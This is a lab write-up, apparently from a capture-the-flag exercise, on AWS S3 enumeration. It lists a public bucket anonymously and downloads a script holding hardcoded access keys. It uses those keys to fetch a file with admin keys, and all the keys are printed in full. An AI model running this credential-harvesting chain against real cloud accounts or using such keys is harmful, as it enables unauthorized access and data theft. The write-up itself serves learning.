Hello pwners This is my first writeup in the word of cloud penetration testing specifically AWS. My goal is to consolidate the knowledge I gained from this lab and to share that knowledge with others

The goal of this lab is to teach us the initial phase of AWS penetration testing which is the  enumeration with a focus on S3 enumeration. If you are unfamiliar with S3, you should learn the fundamentals of AWS before proceeding.

The site starts by providing a web link, and the visible URL indicates that it is hosted on AWS.

The site begins by providing a link to a webpage that, upon opening, appears to be a completely ordinary webpage.

<img width="1920" height="1035" alt="image" src="https://github.com/user-attachments/assets/1cdbda4e-e2fc-4c52-91aa-0c0be66bd7ad" />

So, let's take a look at the page's source code.

<img width="1920" height="1035" alt="image" src="https://github.com/user-attachments/assets/d36c750e-4f28-4bc2-8812-42cf40f0f415" />

```html
<meta charset="UTF-8">
<title>Huge Logistics</title>
<link rel="stylesheet" href="https://s3.amazonaws.com/dev.huge-logistics.com/static/">
```

Interestingly, it now appears to be using an S3 bucket named `dev.huge-logistics.com` to store static files.

When I tried to play with that URL in the browser, I didn't find anything useful; everything just resulted in "access denied messages."

<img width="1920" height="1035" alt="image" src="https://github.com/user-attachments/assets/7d2d1ff8-ae12-4bac-888d-43681971a49d" />

So lets try using AWS CLI

```shell
sudo apt install awscli
```

After install it, come with me and lets see what we can do with it

```shell
aws s3 ls s3://dev.huge-logistics.com --no-sign-request
```

lets break it 

aws: is the tool name
s3: is the name of the service that we want to interact with
ls: is the action the we want to do (here we listing the contents)
--no-sign-request: means that the request is anonymous (think of it like the FTP anonymous login)

<img width="1877" height="299" alt="image" src="https://github.com/user-attachments/assets/79a3c8d1-a8ec-493f-9771-a808f85f1d7f" />

Here we go! my request is succeeded, returned with a list of the contents

we can now explore each one

```shell
aws s3 ls s3://dev.huge-logistics.com/admin/ --no-sign-request
aws s3 ls s3://dev.huge-logistics.com/migration-files/ --no-sign-request
aws s3 ls s3://dev.huge-logistics.com/shared/ --no-sign-request
```

actually i am permitted to see the content of the `/shared` only using the anonymous login

<img width="1631" height="87" alt="image" src="https://github.com/user-attachments/assets/a06f08dc-7e78-49f2-9f80-13866dd44641" />

it has one zip file called `hi_migration_project.zip`
so lets get it on my machine 

```shell
aws s3 cp s3://dev.huge-logistics.com/shared/hl_migration_project.zip . --no-sign-request
```

here we replaced the `ls` with `cp` and u can observe its role

after unzip the file we see a PowerShell script

<img width="1808" height="321" alt="image" src="https://github.com/user-attachments/assets/ef9219bb-46ac-45ea-a38f-6dd6e0192895" />

lets see what it hides 

```powershell
# AWS Configuration

$accessKey = "AKIA3SFMDAPOWMWJSZZZ"

$secretKey = "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"

$region = "us-east-1"

  

# Set up AWS hardcoded credentials

Set-AWSCredentials -AccessKey $accessKey -SecretKey $secretKey

  

# Set the AWS region

Set-DefaultAWSRegion -Region $region

  

# Read the secrets from export.xml

[xml]$xmlContent = Get-Content -Path "export.xml"

  

# Output log file

$logFile = "upload_log.txt"

  

# Error handling with retry logic

function TryUploadSecret($secretName, $secretValue) {

$retries = 3

while ($retries -gt 0) {

try {

$result = New-SECSecret -Name $secretName -SecretString $secretValue

$logEntry = "Successfully uploaded secret: $secretName with ARN: $($result.ARN)"

Write-Output $logEntry

Add-Content -Path $logFile -Value $logEntry

return $true

} catch {

$retries--

Write-Error "Failed attempt to upload secret: $secretName. Retries left: $retries. Error: $_"

}

}

return $false

}

  

foreach ($secretNode in $xmlContent.Secrets.Secret) {

# Implementing concurrency using jobs

Start-Job -ScriptBlock {

param($secretName, $secretValue)

TryUploadSecret -secretName $secretName -secretValue $secretValue

} -ArgumentList $secretNode.Name, $secretNode.Value

}

  

# Wait for all jobs to finish

$jobs = Get-Job

$jobs | Wait-Job

  

# Retrieve and display job results

$jobs | ForEach-Object {

$result = Receive-Job -Job $_

if (-not $result) {

Write-Error "Failed to upload secret: $($_.Name) after multiple retries."

}

# Clean up the job

Remove-Job -Job $_

}

  

Write-Output "Batch upload complete!"

  
  

# Install-Module -Name AWSPowerShell -Scope CurrentUser -Force

# .\migrate_secrets.ps1
```

wow!, the script contains hardcoded AWS keys

```powershell
# AWS Configuration

$accessKey = "AKIA3SFMDAPOWMWJSZZZ"

$secretKey = "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"

$region = "us-east-1"

```

you can consider the `accessKey` as a `username` and the `secretKey` as a `password`

Now lets configure the AWS CLI to use this creds instead of anonymous connection

<img width="1019" height="141" alt="image" src="https://github.com/user-attachments/assets/b5b41a21-ffc2-46f9-a7b0-bfc9ef3b2bd9" />
``

now AWS CLI has credentials

```bash
aws sts get-caller-identity
```

this is like `whoami`, it is allow us to  find out our execution context 

<img width="1218" height="178" alt="image" src="https://github.com/user-attachments/assets/73d05563-1c39-419b-bb92-5fb003d66f42" />

the IAM User that we used its creds is named `pam-test`

Now, let's try listing the content the paths that i couldn't see using the anonymous login. `/admin`, `/migration-files`

<img width="1716" height="144" alt="image" src="https://github.com/user-attachments/assets/03ea5f57-ed0b-47b9-830f-dac2e08d51a2" />

in the `/admin` i am able to see the content but i can't to dump it

lets try with `/migration-files`


<img width="1874" height="209" alt="image" src="https://github.com/user-attachments/assets/e340b8a6-7734-4d88-b5c7-7554f03fc0ee" />

```plain
2023-10-16 18:08:47          0 
2023-10-16 18:09:26    1833646 AWS Secrets Manager Migration - Discovery & Design.pdf
2023-10-16 18:09:25    1407180 AWS Secrets Manager Migration - Implementation.pdf
2023-10-16 18:09:27       1853 migrate_secrets.ps1
2026-01-30 21:53:58       2494 test-export.xml

```

in the `migration-files` directory i am able to see and download the files

lets take a look at `test-export.xml`

```bash
aws s3 cp s3://dev.huge-logistics.com/migration-files/test-export.xml .
```

<img width="1247" height="556" alt="image" src="https://github.com/user-attachments/assets/3f50cd33-deb0-4e2e-b221-7f0b32b63cc0" />

```xml
<CredentialEntry>

<ServiceType>AWS IT Admin</ServiceType>

<AccountID>794929857501</AccountID>

<AccessKeyID>AKIA3SFMDAPO6DGDLJAG</AccessKeyID>

<SecretAccessKey>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</SecretAccessKey>

<Notes>AWS credentials for production workloads. Do not share these keys outside of the organization.</Notes>

</CredentialEntry>

```

Wow again!

It is seem that we now have the `AWS IT Admin` creds

now we use Use `aws configure`  again to set the new keys

<img width="1150" height="158" alt="image" src="https://github.com/user-attachments/assets/092d8b7e-c795-447f-9ad3-56ee0fb0fd7f" />

and `aws sts get-caller-identity` reveals that we are the IAM user `it-admin` 

<img width="1285" height="188" alt="image" src="https://github.com/user-attachments/assets/3f7763a7-8d65-4c38-af52-a76124c11d0a" />

Lets now try to get the damn flag

<img width="1620" height="124" alt="image" src="https://github.com/user-attachments/assets/9e035eb6-5233-45bc-9a03-2592fac3493c" />

Yep, and here we go! i could retreve the flag
